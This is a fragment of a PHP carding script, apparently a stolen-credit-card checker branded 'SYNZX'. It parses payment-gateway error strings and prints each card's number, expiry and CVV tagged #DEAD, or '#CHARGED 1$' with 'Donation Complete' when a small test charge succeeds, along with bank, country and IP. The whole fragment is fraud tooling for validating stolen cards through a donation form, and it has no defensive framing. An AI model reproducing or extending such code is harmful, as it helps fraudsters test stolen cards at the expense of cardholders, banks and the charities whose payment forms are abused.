  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br><font class='badge badge-success'>[$ip1]</i></font><br>";

}





elseif

(strpos($result2,  'card was declined.')) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'>#DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Declined [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br><font class='badge badge-success'>[$ip1]</i></font><br>";

}



elseif

(strpos($result2,  "must be a dictionary or a non-empty string.")) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Generic Decline [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2,  "do_not_honor")) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Do_Not_Honor [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br><font class='badge badge-success'>[$ip1]</i></font><br>";

}





elseif

(strpos($result2,  "expired_card")) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Expired Card [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br><font class='badge badge-success'>[$ip1]</i></font><br>";

}



elseif

(strpos($result2,  'Your card does not support this type of purchase.')) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support This Purchase [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br><font class='badge badge-success'>[$ip1]</i></font><br>";

}



elseif

(strpos($result2,  "processing_error")) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>processing_error [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2, "service_not_allowed")) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Service Not Allowed [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}





elseif

(strpos($result2,  "parameter_invalid_empty")) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Declined : Missing Card Details [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2,  "lock_timeout")) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Another Request In Process : Card Not Checked [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2,  "transaction_not_allowed")) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support Purchase [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}





elseif

(strpos($result2,  'Card is declined by your bank, please contact them for additional information.')) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2, "missing_payment_information")) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Payment Informations [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2, "Payment cannot be processed, missing credit card number")) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Credit Card Number [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif 

(strpos($result2,  '-1')) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='white'><font class='badge badge-light'> Update Nonce [  𝙎 𝙔 𝙉 𝙕 𝙓 ]</i></font> <br> <font class='badge badge-primary'>$bank [$country] - $type</i></font> <br>";

}

elseif

(strpos($result1,  '')) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Do_Not_Honor [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br><font class='badge badge-success'>[$ip1]</i></font><br>";

}


else {

  echo "<font size=2 color='white'>  <font class='badge badge-success'> #CHARGED 1$ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Donation Complete [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br><font class='badge badge-success'>[$ip1]</i></font><br>";

}








//echo $result1;
echo "$result2<br>";





?>